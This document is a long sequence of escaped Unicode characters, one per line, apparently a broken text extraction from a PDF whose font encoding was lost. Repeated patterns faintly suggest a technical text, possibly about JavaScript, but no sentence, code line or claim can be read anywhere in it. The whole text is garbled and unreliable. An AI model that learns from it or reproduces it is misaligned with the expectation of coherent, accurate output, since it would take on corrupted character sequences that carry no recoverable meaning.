j\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c6\nF\n\u2022\n>\n\u00f7\n-\n\u00e3\n\ufb02\nF\n\u2022\n\u2021\n\ufb02\n\u00e3\n>\nI\nI\n>\n\u2021\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n\u00c2\n\u00bf\n\u00c1\n\u00c4\n\u2021\n\u2021\n\u00f7\n-\n\u00e3\n\u00c8\n<\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n<\n\u00fb\n-\nU\nI\n\u02d9\n\ufb02\n\u00f7\n-\n\u00e3\n>\nI\n\ufb02\n\u2022\n\u00e3\n<\n\u00fa\n;\nH\n>\n\u00e2\n\u00e2\n>\nH\n\u00c7\n\u00fa\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n\u2021\n\u00fa\nH\n\u00c7\n\u00fa\nT\n\ufb02\n;\nH\n\u00fa\n\u00fa\nt\n>\nH\n\ufb02\n>\n\u00fa\n\u2030\n\u00f6\n\u2030\n\u00c7\n\u00b1\n\u2021\nH\n\u00bc\n\ufb02\n\u2021\n\u2030\n\ufb02\nH\n\u00bc\n>\nH\n>\n\u2021\n\u2021\n\u00f6\n,\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n;\nH\n\u00bc\n\ufb02\n\u00c7\n\u00fa\n;\nH\n>\n\u00e2\n\u00e2\n>\nH\n\u00c7\n\u00fa\nw\n\u00bc\n\u00c7\n\u00e2\n\ufb02\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u2021\n\u2030\n\ufb02\n0\n\ufb02\n\u00f6\n>\n\u00c7\n\u00fa\n;\n\u00f6\n0\n\ufb02\n;\nH\n>\nH\n\u00c7\n\u2021\n&\n;\n\ufb02\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00c7\n\u00fa\n\u00b3\n\u00e2\n>\n\u00fa\n\u00b3\nT\n>\n\u00b3\n\ufb02\n;\n;\nT\n\u2021\n\u00bc\n>\n;\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u2021\n0\n\u00c7\n,\nH\n\u00e2\n\ufb02\nH\n;\nM\n0\n\u2021\n0\n\u00c7\n,\nH\n>\n\u00fa\n\u2030\nW\n\u00ba\n\u00b0\n&\n;\n\ufb02\n;\n\u00c7\n\u00f6\n,\n\u00e2\n\ufb02\n~\n\u00b1\nT\n;\n\u2021\n>\nH\n\u00c7\n\u00fa\n;\nT\n\u2021\n\u00bc\n>\n;\n~\n>\n;\n\ufb02\n\u00c1\n\u00be\n\u00b3\n\u201c\n\u00c7\n,\n\u2021\n\u00f6\n,\n0\n\ufb02\n;\n;\n\u00c7\n\u00fa\n>\n\u00fa\n\u2030\n\u00c7\n\u00fa\n;\n\ufb02\n0\nH\n\u00c7\n\u00fa\n\u00b1\n\u00b3\n>\n0\n~\n>\n\u00b3\n\ufb02\n\u2021\n\u00bc\n>\n0\n>\n\u2021\nH\n\ufb02\n0\n;\n,\n\u00e2\n\u00c7\nH\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00c7\nH\n\u2021\n\u00b1\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00e5\n\u2021\n\u2030\n\ufb02\nH\n\u00bc\n>\nH\n\ufb02\n;\nH\n>\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n;\n,\n\ufb02\n0\n;\n\u00c7\n;\nH\n\ufb02\n\u00fa\n\u2021\n\ufb02\n\u00b1\n0\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c7\n\u00fa\nH\n;\n\ufb02\n,\n>\n0\n>\nH\n\ufb02\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n>\n\u00fa\n\u2030\n;\n\u2021\n0\n\u00c7\n,\nH\n;\nF\n\u2022\n>\n\u00f7\n-\n\u00e3\n\ufb02\n\u00c1\n\u00ff\n\ufb02\n<\nU\n\u00f7\n\ufb02\n1\nI\n\u00b1\n\u02d9\n\u00bc\n\ufb02\n0\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00b1\n0\n\u00f6\nH\n\u00bc\n\ufb02\n\ufb02\n,\nH\n\ufb02\n\u00f6\n~\n\ufb02\n0\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n>\nH\nH\n>\n\u2021\n\u00db\n0\n\ufb02\nH\n0\n\u00c7\n\ufb02\nt\n\ufb02\n;\nH\n\u00bc\n\ufb02\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n\u00c9\n\u00fb\nP\n=\n\u00b0\n\u2030\n\ufb02\n\u00b1\n\u00c7\n\u00fa\n\u00c7\nH\n\u00c7\n\u00fa\n\u00fa\n>\n\u00f6\n\ufb02\n\u2030\n0\n\ufb02\n>\n\u2030\n\u00f6\n\ufb02\nH\nH\nT\n;\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n>\n\u00fa\n\u00fa\n\u2021\n\u00f6\nT\n;\nj\n\u02d9\n\u00fb\n\u00e2\n\u00b3\n\u00fa\nH\nH\n\u00bc\n\ufb02\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n;\n;\n\ufb02\n0\nt\n\ufb02\n0\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c7\n\u00c9\n\u00fb\nP\n=\n\u00b0\n\u2030\n\ufb02\n\u00b1\n\u00c8\n\u00fb\n\u00c8\nI\n\u00c8\n\u00fb\n\u00e0\n1\n\ufb02\n>\n\u2030\n\u00f7\n\ufb02\nI\n\u2022\nI\n\u00e1\n\u02d9\n\u00bc\n\u00c7\n;\n\u2030\n\ufb02\n\u00b1\n\u00c7\n\u00fa\n\u00c7\nH\n\u00c7\n\u00fa\n\u00c7\n\u00fa\nH\nT\n0\n\u00fa\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n;\n>\nM\n0\n\u2021\n0\n\u00c7\n,\nH\n\u00b1\n>\nt\n\u00c7\n\u2021\n\u00fa\n\u00c7\n\u2021\n\u00b1\n\u00c7\n\u00e2\n\ufb02\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nH\n\u00bc\n\ufb02\n\u00fa\n\u2021\n0\n\ufb02\n>\nH\n\ufb02\n;\n>\n\u00fa\n\u2030\n0\nT\n\u00fa\n;\nH\nw\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n\u00b1\n\u02d9\n\u00ba\n\u00fb\n\u00b1\n\u2030\n\u00c7\n0\n\ufb02\n\u2021\nH\n0\n\u2021\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c9\n4\n\u2030\n\ufb02\n<\n\u00fb\n\u00c8\n-\n-\n\ufb02\n\u2030\n<\n\u00bd\nx\n\u00c8\n\u00fb\n\u00b4\nM\n0\n\u2021\n1\n\u00c8\n-\nI\n\u2030\n1\n-\n-\n\u00c8\n\u00fb\n\u00b4\n\u00c2\n\u00a7\n>\nu\n>\n\u2021\n1\n\u00c8\n-\nI\n\u00b1\n\u00c8\n\u00e3\n\ufb02\n<\n \u02d9\n\u00bc\n\ufb02\n\u00d9\n~\n\u00b1\nH\n\u00bc\n\ufb02\n;\n\u00f6\n>\n\u00e2\n\u00e2\n\ufb02\n0\n\u00b1\nH\n\u00bc\n\ufb02\nH\nw\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n;\n\u00c7\n;\nH\n\ufb02\n;\nH\n>\n~\n\u00e2\n\u00c7\n;\n\u00bc\n>\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\n>\nT\nH\n;\nH\n>\n0\nH\n\u00f6\n\ufb02\n\u2021\n\u00bc\n>\n\u00fa\n\u00c7\n;\n\u00f6\nH\n>\n\u2021\n\u2021\n\u00f6\n,\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n;\nH\n\u00bc\n\u00c7\n;\n~\n\u2021\n\u2030\n\ufb02\n~\n\u00b1\nT\n;\n\u2021\n>\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\nH\n\u00bc\n\ufb02\n0\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00e2\n\u00c7\n\u00fa\n\u00db\n\u00d9\n;\n\u00c7\n\u00fa\nH\n\u00b1\n\u02d9\n\u00ba\n\u00fb\n\u00b1\n\u00b0\n\u00c7\n\u00fa\n\u00db\n\u00d9\n;\n\u00c7\n\u00fa\nH\nT\n0\n\u00fa\n\u2021\n0\n\ufb02\n>\nH\n\ufb02\n;\n>\n;\n\u00bc\n0\nH\n\u2021\nT\nH\n%\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00a7\n>\nt\n>\n\u00ea\n\u02d9\n\u00ba\n\u00eb\n\u00fb\n\u00e2\n>\nH\n\u00b1\n0\n\u00f6\nF\nT\nH\n&\n,\n\u2030\n>\nH\n\ufb02\n0\n\u00e2\n\u00fa\n\u00db\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\nH\n>\n0\nH\nT\n,\n;\n,\n\ufb02\n\u2021\n\u00c7\n>\n\u00e2\n\u00b1\n\u00e2\n\u2030\n\ufb02\n0\n,\n\u00c7\n\u00fa\nH\n\u00c7\n\u00fa\n\u00b3\nH\nH\n\u00bc\n\ufb02\n\u00f6\n>\n\u00c7\n\u00fa\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00ca\n4\n\u2030\n\ufb02\n\u00b1\n1\n\ufb02\n<\nI\n>\n~\n\u00e3\n\u00c8\n<\n\u00bd\n\u00c8\n\u00fb\n\u00b4\n-\n\ufb02\n1\n<\n\u00c8\n<\nI\n\ufb02\n\u00fb\n\u2021\n\ufb02\n>\n\u00b1\nI\n\ufb02\n1\n1\n\ufb02\n~\nI\n\u00e0\n>\nU\nI\n<\nI\n>\n1\nI\n\u00f7\n\ufb02\n\u2021\n\u00bd\n>\n\u00fb\n\u00c8\n<\n\u00f7\n\u00e1\n\u02d9\n\u00bc\n\ufb02\n\u00d9\n~\n\u00b1\nH\n\u00bc\n\ufb02\n\u00e2\n>\n0\n\u00b3\n\ufb02\n0\n\u00b1\nH\n\u00bc\n\ufb02\nH\nw\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n;\n\u00c7\n;\nH\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n>\n\u00fa\n\u2030\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\nH\n\u00bc\n\ufb02\n4\n~\n>\n\u00e2\nH\nH\n0\n\u00c7\n\u00db\n\ufb02\n,\n>\n\u2021\n\u00e2\n>\n\u2030\nH\n>\n\u2021\n\u2021\n\u00f6\n,\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n;\nH\n\u00bc\n\u00c7\n;\n~\n\u2021\nw\n0\n\u00c7\nH\n\u00c7\n\u00fa\n\u00b3\n\u00f6\n0\n\ufb02\n\u2021\n\u2030\n\ufb02\nH\n0\nP\nT\n\u00b3\n\u00c0\n\u00fa\n\u00b9\n\u00fb\nu\n&\nj\n\u00d9\n=\nj\n\u2021\n~\n\u00c4\n\u00db\n\u00d9\n;\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\nH\n\ufb02\n\u00f6\n,\n0\n>\n0\n\u2021\n\u2030\n\u00c7\n0\n\ufb02\n\u2021\nH\n0\n\u2021\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nH\n\u00bc\n\ufb02\n\u00fa\n0\nT\n\u00fa\n;\n>\n\u00fb\nw\n\ufb02\n0\n\u00bc\n\ufb02\n\u00e2\n\u00e2\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\n\u00ea\n~\n\u00b1\nT\n;\n\u2021\n>\nH\n\ufb02\n\u2030\nT\n;\n\u00c7\n\u00fa\n\u00b3\n\u00b3\n>\n0\n~\n>\n\u00b3\n\ufb02\n\u2021\n\u00bc\n>\n0\n>\n\u2021\nH\n\ufb02\n0\n;\n~\n>\n;\n\ufb02\n\u00c1\n\u00be\n\ufb02\n\u00fa\n\u2021\n\u2030\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\u2030\nl\n\u201c\n\u00c7\n,\n\u2021\n\u00f6\n,\n0\n\ufb02\n;\n;\n\u00c7\n\u00fa\n\u00eb\n\u02d9\n\u00bc\n\ufb02\n\u00fb\nw\n\ufb02\n0\n\u00bc\n\ufb02\n\u00e2\n\u00e2\n\u00c7\n;\n>\n\u2030\n\ufb02\n\u00b1\n>\nT\n\u00e2\nH\n4\n~\n>\n\u00e2\nH\nH\n0\n\u00c7\n\u00db\n\ufb02\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n\ufb02\n0\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00cb\n\u00fb\nx\n\ufb02\n1\n\u00bd\n\ufb02\n\u00e3\n\u00e3\n\u2021\n\u2030\n\ufb02\n\u2030\nx\n\u00fb\n\u00e3\n>\n\u2030\n\u00c8\n\u00fb\n\u00b4\n4\n~\n>\n\u00e3\nI\nI\n1\n\u00c8\n\u00dc\n\ufb02\nF\n\u2022\n>\n\u00f7\n-\n\u00e3\n\ufb02\n\u00c2\n\u00ba\n>\n\u00e3\n\u00c8\n\u2021\n\u00c8\nU\n<\n\u00ba\n\u00c8\n\u2021\n1\n<\n\u00b1\nI\n\u00fb\nU\n~\n\u00e3\n\u00c8\n<\n\u00bd\n\ufb02\n1\n\u2030\n\u2021\nU\n\u00f7\n\ufb02\n\u00fb\nI\n\u02d9\n\u00bc\n\ufb02\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n;\n\u2021\n0\n\u00c7\n,\nH\n\ufb02\n\ufb02\n\u2021\nT\nH\n\ufb02\n\u2030\n~\n\u2021\nH\n\u00bc\n\ufb02\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n;\n>\n\u00fa\n\u2030\n0\nT\n\u00fa\n;\n\u2021\n\ufb02\nH\n>\n\u00fa\nH\n\u00bc\n\ufb02\n0\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00b9\n\u00d9\n;\n\u00bc\n;\nH\n\ufb02\n\u2030\n\u00fa\nH\n\u00bc\n\ufb02\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n\u00f8\n\u2021\n\u00fa\nH\n0\n\u00e2\n\u00e2\n\ufb02\n\u2030\n;\n\ufb02\n0\nt\n\ufb02\n0\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00bf\n\u00ba\n>\n\u00e3\n\u00c8\n\u2021\n\u00c8\nU\n<\n<\n\u2021\n1\n\u00c8\n-\nI\n\ufb02\n\u2022\n\ufb02\n\u2021\nU\nI\n\ufb02\n\u2030\n~\n\u2026\nI\n\u00bd\n\ufb02\n\u00ba\n\u00c8\n\u2021\n1\n<\n\u00b1\nI\n\u00fb\nU\n~\n\u00e3\n\u00c8\n<\n\u00bd\n\ufb02\n1\n\u00b1\n\u00c8\n\u00e3\n\ufb02\n\u00e0\n<\n\u00bd\n>\n\u00c2\n\u00c6\n\u00c7\n\u00c3\n\u00bf\n\u00c6\n\u00b1\n\u00c3\n\u00c3\n\u00c1\n~\n\u00b1\n~\n\u00c1\n\ufb02\n\u00cb\n\u00c9\n\u00bf\n\u00c2\n\u00ca\n\u00b1\n\u00ca\n\u2021\n\u00cb\n\u00c2\n\u2021\n~\n\u2021\n~\n\u00c1\n\u2030\n\u00b1\n\u00b1\n\u00c2\n\u00c9\n\u00c4\n\u00c1\n\u2030\n\u2021\n\u2030\n\u2030\n>\n\u2021\n\u2021\n\u00c9\n\u00c7\n\u00ca\n\u00c4\n\u00c3\n\ufb02\n\u00c7\n\u00c6\n\u00b1\n\u00cb\n~\n\u00c1\n\ufb02\n\u2021\n\u00c6\n>\n\u00c7\n\u00c7\n\u00b1\n\u00c6\n\u00c2\n~\n\u2021\n\u00e1\n \u00c7\n\u00f6\n\u00c7\n\u00e2\n>\n0\nH\nH\n\u00bc\n\ufb02\n,\n0\n\ufb02\nt\n\u00c7\nT\n;\n\ufb02\n>\n\u00f6\n,\n\u00e2\n\ufb02\n\u00ea\n0\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\u00eb\nH\n\u00bc\n\ufb02\n\u00b9\n\u00d9\n;\n\u00bc\n>\n\u00fa\n\u2030\n\u00e2\n\ufb02\n;\nH\n\u00bc\n\ufb02\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\n>\nT\nH\n;\nH\n>\n0\nH\n\u00f6\n\ufb02\n\u2021\n\u00bc\n>\n\u00fa\n\u00c7\n;\n\u00f6\nt\n\u00c7\n>\n>\n;\n\u00bc\n0\nH\n\u2021\nT\nH\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00b1\n\u00b1\n\u00c7\n\u2021\n\ufb02\n\u00bd\n\u00c1\n\u00c0\n\u00e2\n\u00fa\n\u00db\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\nH\n>\n0\nH\nT\n,\n;\n,\n\ufb02\n\u2021\n\u00c7\n>\n\u00e2\n\u00b1\n\u00e2\n\u2030\n\ufb02\n0\nu\nw\n\ufb02\nt\n\ufb02\n0\nH\n\u00bc\n\ufb02\n;\n\u00bc\n0\nH\n\u2021\nT\nH\n>\n~\nT\n;\n\ufb02\n;\nH\n\u00bc\n\ufb02\n/\nT\n\u00c7\n~\n\u00e2\n\u2021\n\u2030\nH\n\ufb02\n\u2021\n\u00bc\n\u00fa\n\u00c7\n/\nT\n\ufb02\n\u00ec\n\u00c1\n\u00ed\n\u00ba\n0\n\ufb02\nt\n\ufb02\n0\nH\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c7\n;\n\u00fa\nH\n0\nT\n\u00fa\n\u2030\n\u00c7\n0\n\ufb02\n\u2021\nH\n\u00e2\n\u2021\n~\nT\nH\nt\n\u00c7\n>\n>\n\u00fa\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00f6\n\ufb02\n\u2030\n\u00c7\n>\n0\n\u2021\n\ufb02\n=\n\u00e2\n\u00e2\n\u00ea\n;\n\ufb02\n\ufb02\n~\n\ufb02\n\u00e2\nw\n\u00eb\n\u00b9\n\u00d9\n;\n>\n\u00e2\n;\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n;\nH\nw\n>\n\u2030\n\u2030\n\u00c7\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n\u00b1\n0\n\u00f6\nH\n\u00bc\n\ufb02\n4\n\u00e5\n4\n;\n\ufb02\n0\nt\n\ufb02\n0\n\u00ea\n\u00b3\n0\n\ufb02\n\ufb02\n\u00fa\n\u2030\n\u2030\n\u2030\n>\n\u00fa\n\u2030\n\u00b3\n0\n\ufb02\n\ufb02\n\u00fa\nH\n\u00f6\n,\n\u00eb\n\u02d9\n\u00bc\n\ufb02\n\u00b1\n\u00c7\n0\n;\nH\n\u00b1\nH\n\u00bc\n\ufb02\n;\n\ufb02\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n\u00b3\n0\n\ufb02\n\ufb02\n\u00fa\n\u2030\n\u2030\n\u2030\n\u00c7\n;\n>\n\u00fa\n\ufb02\n\ufb02\n\u2021\nT\nH\n>\n~\n\u00e2\n\ufb02\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00fa\n>\n\u00e2\n\u00e2\n\u2021\n\u00fa\n>\n\u00f6\n\ufb02\n\u2030\nF\n=\n\u00e2\n\u00e2\n2\nP\n\u00c7\n\u00fa\n\u00bd\n\u00bc\n\u2030\n\u00e2\n\u00e2\n\u02d9\n\u00bc\n\u00c7\n;\n\u00c7\n;\n>\n\u00db\n\u00fa\nw\n\u00fa\n~\n>\n\u2021\n\u00db\n\u2030\n0\nT\n;\n\ufb02\n\u2030\n~\n\u2021\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n;\n\u00c7\n\u00fa\n\u2021\n\ufb02\n\u00bc\n\u00b9\n\u00bb\n\u00be\n\u00b1\n0\nH\n\u00bc\n\ufb02\n;\n>\n\u00f6\n\ufb02\n,\nT\n0\n,\n;\n\ufb02\n\u2030\n\ufb02\n\u2021\n0\n\u2021\n,\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\u2030\n\ufb02\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u00b1\n\u00c7\n\u00fa\n>\n\u00e2\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c9\n0\n\u201c\n\u02d9\n\u00e2\n;\n\u00be\n>\n\u00fb\nu\n>\n\u00c8\n\u00bd\nU\nP\n\ufb02\n\u00bc\n>\nt\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\nt\n>\n0\n\u00c7\n>\n\u00fa\nH\n;\n\u00b1\nH\n\u00bc\n\u00c7\n;\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n~\n>\n\u2021\n\u00db\n\u2030\n0\nT\n;\n\ufb02\n\u2030\n\u00c7\n\u00fa\nt\n>\n0\n\u00c7\nT\n;\n\u2021\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n;\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n;\n\ufb02\n,\nT\n~\n\u00e2\n\u00c7\n\u2021\n>\n\u00e2\n\u00e2\n\u2021\n0\n\ufb02\n,\n0\nH\n\ufb02\n\u2030\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n\u2021\n\u00fa\nH\n\u00c7\n\u00fa\nT\n\ufb02\n;\nH\n\u00c7\n\u00f6\n,\n0\nt\n\ufb02\n>\n\u00fa\n\u2030\n0\n\ufb02\n\u00b1\n\u00c7\n\u00fa\n\ufb02\nH\n\u00bc\n\ufb02\n\u00f6\n>\n\u00e2\nw\n>\n0\n\ufb02\n~\n\u2021\n\u00b1\n0\n\ufb02\n>\n\u00f6\n,\n\u00e2\n\ufb02\nw\n0\n>\n,\n,\n\u00c7\n\u00fa\n\u00b3\n\u00c7\nH\n\u00c7\n\u00fa\n;\n\u00c7\n\u2030\n\ufb02\n>\n\u00fa\nu\n\u02d9\nw\n0\n>\n,\n,\n\ufb02\n0\n\ufb02\nt\n\ufb02\n0\n>\n\u00e2\n\u00b3\n\u2030\n\u2030\n\ufb02\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00c7\n\u00fa\n;\n>\n0\n\ufb02\n>\nt\n>\n\u00c7\n\u00e2\n>\n~\n\u00e2\n\ufb02\n%\n\u00c7\n\u00fa\n>\n\u00fa\n>\n\u00e2\n\u2021\n;\n\ufb02\n;\n\u00b1\n0\n\u00f6\n\u00b1\n\ufb02\n\u00e2\n\u00e2\nw\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\ufb02\n0\n;\n\u00ec\n\u00bd\n\u00ed\n\u00ec\n\u00be\n\u00ed\n0\n>\n;\n\u00c7\n\u2021\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00c7\nH\n\u2021\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\ufb02\n;\n\u00fa\n\u00b1\n0\n\u00f6\n>\nH\n\u00c7\n\u00fa\n\u00b3\n>\nH\n\u00bc\n\ufb02\n0\n\u00c7\n\u00fa\n\u00b3\n\u00ea\n\u2021\n\u00f6\n,\nT\nH\n\ufb02\n0\n\u00fa\n>\n\u00f6\n\ufb02\nT\n;\n\ufb02\n0\n\u00fa\n>\n\u00f6\n\ufb02\n;\n\ufb02\n0\n\u00c7\n>\n\u00e2\n\u00fa\nT\n\u00f6\n~\n\ufb02\n0\n,\n0\n\u2021\n;\n\ufb02\n0\nt\n\ufb02\n0\n\u00eb\n=\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n&\n\u00ff\n\u00b0\nF\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n0\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00ff\n\ufb02\n\u00b3\n\u00c7\n;\nH\n0\n\u2021\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\n,\n0\n\u2021\n\ufb02\n;\n;\n\u2030\n\u00c7\n0\n\ufb02\n\u2021\nH\n0\n\u2021\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n,\n\ufb02\n0\n>\nH\n\u00c7\n\u00fa\n;\n>\n\u00b1\n\ufb02\nF\n\u00ea\n\u2021\n\u00bc\n>\n\u00fa\n\u00b3\n\ufb02\nF\n;\n\ufb02\nH\nH\n\u00c7\n\u00fa\n\u00b3\n;\nH\n0\n\ufb02\n\u2030\nT\n\u2021\n\ufb02\nw\n>\n0\n\u00fa\n\u00c7\n\u00fa\n\u00b3\n;\n>\n~\nT\nH\n>\n~\nT\nH\n\u00f6\n>\n\u00e2\nw\n>\n0\n\ufb02\n>\n\u2021\nH\n\u00c7\nt\n\u00c7\nH\n\u2021\n\u00eb\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\n\u00c1\n\u2021\n1\n\ufb02\n\ufb02\n\u00fb\n<\n\u00bd\nI\n\u00b1\n1\n\u00f7\n\u00c2\n\u00bf\n\u00c1\n\u00c6\nu\n\ufb02\n1\n<\n\u00c8\n\u00fb\n\u00b1\nI\n\u00bd\n\ufb02\n\u00f7\n>\n\u00e3\nx\n>\n1\n\ufb02\n\u2030\n1\n-\n-\n\ufb02\n\u2030\n~\n\u2026\n=\n\u00c9\n\u00a7\nI\n>\n\u00b1\n\u00b1\n~\n\u00fb\nU\n<\n\u00a7\n>\n\u00fb\nU\n>\n1\n\u2026\n\u00c1\n\u00c3\n\u00c2\n\u00bf\n\u00c1\n\u00c6\n\u2022\n\u00e3\n<\n\u00c9\n1\n\u201d\nP\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\nH\n\u00bc\n\u00c7\n;\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c7\n\u00fa\n>\n\u00fa\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u2021\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n\u2030\n0\n,\n,\n\ufb02\n\u2030\n~\n\u2021\nH\n\u00bc\n\ufb02\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n>\n;\nw\n\ufb02\n\u00e2\n\u00e2\n>\n;\n\u00f6\nT\n\u2021\n\u00bc\n\ufb02\n>\n0\n\u00e2\n\u00c7\n\ufb02\n0\n\u00c7\n\u00fa\n\u00bc\n\u00b9\n\u00bb\n\u00be\nP\n\ufb02\n\u00fa\n>\n\u00f6\n\ufb02\n\u2030\n\u00c7\nH\n\u2030\nT\n\ufb02\nH\n>\nt\n>\n0\n\u00c7\n>\n~\n\u00e2\n\ufb02\n\u00fa\n>\n\u00f6\n\ufb02\n0\n\u201c\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\n\u00c7\n;\n\u2021\n\u00bc\n>\n\u00fa\n\u00b3\n\ufb02\n\u2030\nH\n\u2021\n0\n\ufb02\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n\u00f6\n0\n\ufb02\n0\n\ufb02\n\u2021\n\ufb02\n\u00fa\nH\nt\n\ufb02\n0\n;\n\u00c7\n\u00fa\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n\u2021\n\u00fa\n;\n\u00c7\n;\nH\n\ufb02\n\u00fa\nH\n\u00e2\n\u2021\nH\nw\n\ufb02\n>\n\u00db\n;\n>\n\u00fa\n\u2030\n\u00c7\n\u00f6\n,\n0\nt\n\ufb02\n;\nH\n\u00bc\n\u00c7\n;\n~\n>\n\u2021\n\u00db\n\u2030\n0\n>\n;\nw\n\ufb02\n\u00e2\n\u00e2\n\u02d9\n\u00bc\n\ufb02\n~\n>\n\u2021\n\u00db\n\u2030\n0\n\u00c7\n;\n>\n\u00b1\n>\n\u00c7\n0\n\u00e2\n\u2021\n\u00c7\n\u00fa\nt\n\u00e2\nt\n\ufb02\n\u2030\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00f6\n>\n\u00e2\nw\n>\n0\n\